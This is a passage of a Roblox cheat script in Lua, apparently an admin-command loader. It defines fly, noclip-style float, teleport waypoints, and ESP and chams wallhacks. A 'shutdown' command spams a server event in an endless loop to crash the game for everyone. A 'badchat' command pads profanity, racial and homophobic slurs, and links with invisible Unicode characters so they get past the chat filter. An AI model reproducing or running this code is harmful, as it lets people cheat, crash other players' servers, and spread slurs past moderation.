BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
else
BV.velocity = Vector3.new(0, 0, 0)
end
	BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			Players.LocalPlayer.Character.Humanoid.PlatformStand = false
		end)
	end
	IYMouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = iyflyspeed
		elseif KEY:lower() == 's' then
			CONTROL.B = -iyflyspeed
		elseif KEY:lower() == 'a' then
			CONTROL.L = -iyflyspeed 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = iyflyspeed
		end
	end)
	IYMouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	Players.LocalPlayer.Character.Humanoid.PlatformStand = false
end

Players.LocalPlayer.CharacterAdded:Connect(function()
	FLYING = false
	Floating = false
	execCmd('clip')
end)

addcmd('fly',{},
function(args, speaker)
	sFLY()
end)

addcmd('flyspeed',{'flysp'},
function(args, speaker)
	if isNumber(args[1]) then
		iyflyspeed = args[1]
	end
end)

addcmd('unfly',{'nofly'},
function(args, speaker)
	NOFLY()
end)

addcmd('togglefly',{},
function(args, speaker)
	if FLYING then
		NOFLY()
	else
		sFLY()
	end
end)

Floating = false
addcmd('float', {},
function(args,speaker)
	Floating = true
	local pchar = Players.LocalPlayer.Character
	if pchar and not pchar:FindFirstChild("Float") then
		spawn(function()
			local Float = Instance.new('Part', pchar)
			Float.Name = 'Float'
			Float.Transparency = 1
			Float.Size = Vector3.new(6,1,6)
			Float.Anchored = true
			Float.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
			notify('Float','Float Enabled')
			spawn(function()
				while wait(0.1) do
					if pchar:FindFirstChild("Float") then
						Float.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
					else
						break
					end
				end
			end)
		end)
	end
end)

addcmd('unfloat',{'nofloat'},
function(args, speaker)
	Floating = false
	local pchar = Players.LocalPlayer.Character
	notify('Float','Float Disabled')
	if pchar:FindFirstChild("Float") then
		pchar.Float:Destroy()
	end
end)

addcmd('togglefloat',{},
function(args, speaker)
	if Floating then
		execCmd('unfloat')
	else
		execCmd('float')
	end
end)

addcmd('savepos',{'spos','saveposition','setwaypoint'},
function(args, speaker)
	local WPName = tostring(getstring(1))
	if speaker.Character:findFirstChild("HumanoidRootPart") then
		notify('Modified Waypoints',"Created waypoint: "..getstring(1))
		local torso = speaker.Character:findFirstChild("HumanoidRootPart")
		WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}}
	end	
	refreshwaypoints()
	updatesaves()
end)

addcmd('deletepos',{'dpos','deleteposition','deletewaypoint'},
function(args, speaker)
	for i,v in pairs(WayPoints) do
		if v.NAME == tostring(getstring(1)) then
			notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
			table.remove(WayPoints, i)
		end
	end
	refreshwaypoints()
	updatesaves()
end)

addcmd('clearpos',{'clrpositions','clearpositions','cpos','clrpos'},
function(args, speaker)
	WayPoints = {}
	refreshwaypoints()
	updatesaves()
	notify('Modified Waypoints','Removed all waypoints')
end)

addcmd('loadpos',{'lpos','loadposition','waypoint'},
function(args, speaker)
	local WPName = tostring(getstring(1))
	if Players.LocalPlayer.Character then
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			if tostring(WayPoints[i].NAME) == tostring(WPName) then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
			end
		end
	end
end)

addcmd('esp',{},
function(args, speaker)
	if not CHMSenabled then
		ESPenabled = true
		for i,v in pairs(Players:GetChildren()) do
			if v.ClassName == "Player" and v.Name ~= Players.LocalPlayer.Name then
				ESP(v)
			end
		end
	else
		notify('ESP','Disable chams (nochams) before using esp')
	end
end)

addcmd('shutdown',{},
function(args, speaker)
while wait() do
   for i,v in pairs(game:GetService'Players':GetPlayers()) do
       if v.Character ~= nil and v.Character:FindFirstChild'Head' then
           for _,x in pairs(v.Character.Head:GetChildren()) do
               if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true) end
           end
       end
   end
end
end)
addcmd('cupclub',{'cclub'},
function(args, speaker)
for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), 2.7, 0.8)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 20 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i)-3.4, 0.7, 0.8)) * CFrame.Angles(math.rad(90), math.rad(90), 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 20 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i)-3.4, 25.7, 0.8)) * CFrame.Angles(math.rad(90), math.rad(90), 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), 3.2, -0.4)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), 3.2, 4.6)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end
for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), 3.2, 9.6)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end
for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), 3.2, 14.6)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 6 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), -17.3, 0.8)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 14 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i+11), -17.3, 0.8)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), 2.7, -4.2)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 20 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i)-3.4, 0.7, -4.2)) * CFrame.Angles(math.rad(90), math.rad(90), 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 20 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i)-3.4, 25.7, -4.2)) * CFrame.Angles(math.rad(90), math.rad(90), 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 6 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), -17.3, -4.2)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 14 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i+11), -17.3, -4.2)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), -6.8, -0.4)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), -6.8, 4.6)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end
for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), -6.8, 9.6)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end
for i = 1, 25 do
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new((i), -6.8, 14.6)) 
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
end

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(1, -17.3, -10.2)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(13, -17.3, 3)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -17.3, 3)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
--------------------------------------------------------------------------------------------------------------------------------------------
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -17.3, -11)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -17.3, 10)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
--------------------------------------------------------------------------------------------------------------------------------------------
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(15, -17.3, -11)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -17.3, 17)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(19, -17.3, -11)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()
--------------------------------------------------------------------------------------------------------------------------------------------
game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(22, -17.3, -11)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -17.3, 24)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(10.5, -17.3, 24)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(13, -17.3, 24)) * CFrame.Angles(math.rad(90), 0 , math.rad(90))
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(26, -17.3, -11)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character
wait()

game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -7.3, 0.8)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character



game.Players.LocalPlayer.Backpack.Cup.Grip = CFrame.new(Vector3.new(8, -7.3, -4.2)) * CFrame.Angles(math.rad(90), 0 , 0)
wait()
game.Players.LocalPlayer.Backpack.Cup.Parent = game.Players.LocalPlayer.Character







p = game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()
for i = 1,#p do
if (p[i].Name=="Foil") then
local t = p[i]:FindFirstChild("Handle") 
if (t ~= nil) then
local m = t:FindFirstChild("Mesh")
if (m~= nil) then
m:Destroy()
end 
end 
end 
end
end)

addcmd('shield',{},
function(args, speaker)
local dankamount = 60 
local coolness = 2 



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= dankamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
for i = .3, 2 do
tool.Grip = CFrame.new(Vector3.new(math.sin(index * i), -coolness, i)) * CFrame.Angles(math.sin(index * i), index, i) * CFrame.new(Vector3.new(0, 0, 0))
tool.Parent = LocalPlayer.Character
end
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = coolness
end)

addcmd('umbrella',{},
function(args, speaker)
local toolamount = 50 -- How much covered the bowl is
local bowlsize = 10 -- How big the bowl is



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
for i = .2, 3.5 do
tool.Grip = CFrame.new(Vector3.new(math.sin(index * i), bowlsize, i)) * CFrame.Angles(math.sin(index * i), index, i)
tool.Parent = LocalPlayer.Character
end
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

addcmd('cuffed',{},
function(args, speaker)
local player = game:GetService('Players').LocalPlayer;
player.Character.Torso:Destroy();
player.CharacterAdded:connect(function()
player.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(-42,46,234);
end)
end)

addcmd('window',{},
function(args, speaker)
local toolamount = 40 -- How much covered the ball is
local ballsize = 4 -- How big the ball is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = true
		for i = .7, 7 do
        tool.Grip = CFrame.new(Vector3.new(i, ballsize, i)) * CFrame.Angles(math.ceil(index), index, i)
        tool.Parent = LocalPlayer.Character
	end
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = ballsize
end)


addcmd('badchat',{},
function(args, speaker)
game.Players.LocalPlayer.Chatted:connect(function(a)
if a:sub(1,3)=="/e " then 
    local b = a:sub(4,#a)game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(b,"Q","Q᠎"),"W","W᠎"),"E","E᠎"),"R","R᠎"),"T","T᠎"),"Y","Y᠎"),"U","U᠎"),"I","I᠎"),"O","O᠎"),"P","P᠎"),"A","A᠎"),"S","S᠎"),"D","D᠎"),"F","F᠎"),"G","G᠎"),"H","H᠎"),"J","J᠎"),"K","K᠎"),"L","L᠎"),"Z","Z᠎"),"X","X᠎"),"C","C᠎"),"V","V᠎"),"B","B᠎"),"N","N᠎"),"M","M᠎"),"q","q᠎"),"w","w᠎"),"e","e᠎"),"r","r᠎"),"t","t᠎"),"y","y᠎"),"u","u᠎"),"i","i᠎"),"o","o᠎"),"p","p᠎"),"a","a᠎"),"s","s᠎"),"d","d᠎"),"f","f᠎"),"g","g᠎"),"h","h᠎"),"j","j᠎"),"k","k᠎"),"l","l᠎"),"z","z᠎"),"x","x᠎"),"c","c᠎"),"v","v᠎"),"b","b᠎"),"n","n᠎"),"m","m᠎"),"f᠎u᠎c᠎","f᠎u᠎؜c᠎"),"s᠎h᠎i᠎t᠎","s᠎h᠎؜i᠎t᠎"),"d᠎i᠎c᠎k᠎","d᠎i᠎؜c᠎k᠎"),"c᠎o᠎c᠎k᠎","c᠎o᠎؜c᠎k᠎"),"f᠎a᠎g᠎","f᠎a᠎؜g᠎"),"b᠎i᠎t᠎c᠎h᠎","b᠎i᠎؜t᠎c᠎h᠎"),"a᠎s᠎s᠎h᠎o᠎l᠎e᠎","a᠎s᠎؜s᠎h᠎o᠎l᠎e᠎"),"p᠎e᠎n᠎i᠎","p᠎e᠎؜n᠎i᠎"),"v᠎a᠎g᠎","v᠎a᠎؜g᠎"),"w᠎h᠎a᠎t᠎ t᠎h᠎e᠎ f᠎u᠎؜c᠎","w᠎h᠎؜a᠎t᠎ t᠎h᠎e᠎ f᠎u᠎؜c᠎"),"k؜i؜k᠎","k؜؜i؜k᠎"),"f؜a؜g؜g؜o؜","f؜؜a؜g؜g؜o؜"),"n᠎i᠎g᠎g᠎a᠎","n᠎؜i᠎g᠎g᠎a"),"n᠎i᠎g᠎g᠎e᠎r᠎","n᠎؜i᠎g᠎g᠎e᠎r᠎"),"n᠎i᠎g ","n᠎؜i᠎g "),"s᠎e᠎m᠎e᠎n᠎","s᠎e᠎؜m᠎e᠎n᠎"),"h᠎e᠎n᠎t᠎a᠎i᠎","h᠎e᠎؜n᠎t᠎a᠎i᠎"),"p᠎o᠎r᠎n᠎","p᠎o᠎؜r᠎n᠎"),"w᠎w᠎w᠎.","w᠎w᠎؜w᠎."),"᠎.c᠎o᠎m᠎","᠎.c᠎o᠎؜m᠎"),"᠎.n᠎e᠎t᠎","᠎.n᠎e᠎؜t᠎"),"᠎.o᠎r᠎g᠎","᠎.o᠎r᠎؜g᠎"),"h᠎i᠎t᠎l᠎","h᠎i᠎؜t᠎l᠎"),"l᠎o᠎l᠎i᠎c᠎o᠎n᠎","l᠎o᠎؜l᠎i᠎c᠎o᠎n᠎"),"d᠎i᠎s᠎c᠎o᠎r᠎d᠎","d᠎i᠎؜s᠎c᠎o᠎r᠎d᠎"),"l؜e؜s؜b؜o؜","l؜e؜؜s؜b؜o؜"),"s᠎e᠎x᠎","s᠎e᠎؜x᠎"),"b᠎u᠎l᠎l᠎s᠎h᠎؜i᠎t᠎","b᠎u᠎؜l᠎l᠎s᠎h᠎؜i᠎t᠎"),"m᠎o᠎t᠎h᠎e᠎r᠎f᠎u᠎؜c᠎","m᠎o᠎؜t᠎h᠎e᠎r᠎f᠎u᠎؜c᠎"),"p᠎u᠎s᠎s᠎","p᠎u᠎؜s᠎s᠎"),"c᠎u᠎n᠎t᠎","c᠎u᠎؜n᠎t᠎"),"c᠎u᠎m᠎","c᠎u᠎؜m᠎"),"b᠎e᠎a᠎n᠎","b᠎e᠎؜a᠎n᠎"),"c᠎h᠎i᠎n᠎","c᠎h᠎؜i᠎n᠎"),"c᠎o᠎o᠎n᠎","c᠎o᠎؜o᠎n᠎"),"c᠎o᠎c᠎a᠎i᠎n᠎e᠎","c᠎o᠎؜c᠎a᠎i᠎n᠎e᠎"),"m᠎o᠎t᠎h᠎e᠎r᠎ f᠎u᠎؜c᠎","m᠎o᠎؜t᠎h᠎e᠎r᠎ f᠎u᠎؜c᠎"),"t᠎i᠎t᠎s᠎","t᠎i᠎؜t᠎s᠎"),"t᠎i᠎t᠎t᠎","t᠎i᠎؜t᠎t᠎"),"w᠎h᠎o᠎r᠎e᠎","w᠎h᠎؜o᠎r᠎e᠎"),"s᠎l᠎u᠎t᠎","s᠎l᠎؜u᠎t᠎"),"p᠎r᠎o᠎s᠎t᠎i᠎t᠎u᠎d᠎e᠎","p᠎r᠎؜o᠎s᠎t᠎i᠎t᠎u᠎d᠎e᠎᠎"),"g᠎a᠎y᠎w᠎a᠎d᠎","g᠎a᠎؜y᠎w᠎a᠎d᠎"),"r᠎a᠎p ","r᠎a᠎؜p᠎"),"'","'᠎"),",",",᠎"),"!","!᠎"),"?","?᠎"),"/","/᠎"),"h᠎t᠎t᠎p᠎","h᠎t᠎t᠎p᠎؜"),"h᠎t᠎t᠎p᠎s᠎","h᠎t᠎t᠎p᠎s᠎؜"),"F᠎a᠎g᠎g᠎o᠎t","F᠎aggot"),"A᠎s᠎s᠎h᠎o᠎l᠎e᠎s᠎","A᠎ssholes"),"S᠎h᠎i᠎t᠎t᠎","S᠎hitt"),"m᠎o᠎f᠎o᠎","m᠎o᠎؜f᠎o᠎"),"N᠎i᠎g᠎g᠎","N᠎igg"),"p᠎r᠎o᠎s᠎t᠎i᠎t᠎u᠎t᠎e᠎᠎","p᠎r᠎᠎o᠎s᠎t᠎i᠎t᠎u᠎t᠎e᠎"),"᠎ "," ")," "," ").."","All")
end 
end)
end)

addcmd('noesp',{'unesp'},
function(args, speaker)
	ESPenabled = false
	for i,v in pairs(Players:GetChildren()) do
		local espplr = v
		for i,c in pairs(PARENT:GetChildren()) do
			if c.Name == espplr.Name..'_ESP' then
				c:Destroy()
			end
		end
	end
end)

addcmd('chams',{},
function(args, speaker)
	if not ESPenabled then
		CHMSenabled = true
		for i,v in pairs(Players:GetChildren()) do
			if v.ClassName == "Player" and v.Name ~= Players.LocalPlayer.Name then
				CHMS(v)
			end
		end
		else
		notify('Chams','Disable ESP (noesp) before using chams')
	end
end)

addcmd('nochams',{'unchams'},
function(args, speaker)
	CHMSenabled = false
	for i,v in pairs(Players:GetChildren()) do
		local chmsplr = v
		for i,c in pairs(PARENT:GetChildren()) do
			if c.Name == chmsplr.Name..'_CHMS' then
				c:Destroy()
			end
		end
	end
end)

addcmd('locate',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		Locate(Players[v])
	end
end)

addcmd('twister',{},
function(args, speaker)
pl=game.Players.LocalPlayer
me=pl.Character
xl=me.Torso['Right Shoulder']
t=Instance.new("HopperBin",pl.Backpack)
t.Name="Twister"

local debounce=false
function _restoreproperties() 
Holder = player.Character 
Torso = Holder:FindFirstChild("Torso") 
RightS = Torso:FindFirstChild("Right Shoulder") 
LeftS = Torso:FindFirstChild("Left Shoulder") 
RightH = Torso:FindFirstChild("Right Hip") 
LeftH = Torso:FindFirstChild("Left Hip") 
RightS.MaxVelocity = .15 
LeftS.MaxVelocity = .15 
RightH.MaxVelocity = .1 
LeftH.MaxVelocity = .1 
RightS.DesiredAngle = 0 
LeftS.DesiredAngle = 0 
LeftH.DesiredAngle = 0 
RightH.DesiredAngle = 0 
end 
function ManageAnimation(value) 
Holder = player.Character 
Player = player 
if value == "no anim" then 
Anim = Holder:FindFirstChild("Animate") 
if Anim~=nil then 
